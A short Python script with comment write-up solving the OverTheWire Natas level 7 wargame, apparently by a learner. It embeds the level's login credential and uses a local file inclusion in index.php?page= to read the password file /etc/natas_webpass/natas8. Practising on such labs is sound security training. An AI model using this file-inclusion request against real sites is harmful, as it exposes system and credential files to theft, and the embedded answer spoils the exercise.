#! /usr/bin/python


import requests


#Functions
def cleanheaders(headers):
	for item in headers:
		value=headers.get(item,'Not Found')
		print(f'{item} : {value}')


#Basic Authentication
basic_username,basic_password='natas7:7z3hEENjQtflzgnT29q7wAvMNfZdh0i9'.split(':')


#Website Details
host=f'http://{basic_username}.natas.labs.overthewire.org'
page='/etc/natas_webpass/natas8'
path=f'/index.php?page={page}'

#Custom Headers
custom_headers=''


#Payload
payload=''
url=host+path

session=requests.Session()
response=requests.get(url,auth=(basic_username,basic_password))
content=response.text
status=response.status_code
headers=response.headers



# print(f'HOST : {host}\nuser:{basic_username}\npass:{basic_password}\n')
# cleanheaders(headers)


flag=content.split('\n')[18]
print(''.join(flag))


#WRITEUP
#Opening the page we find a hint : password for webuser natas8 is in /etc/natas_webpass/natas8
#This is a basic  local file inclusion since we can see the links have index.php?page=file.php
#So we can just change file.php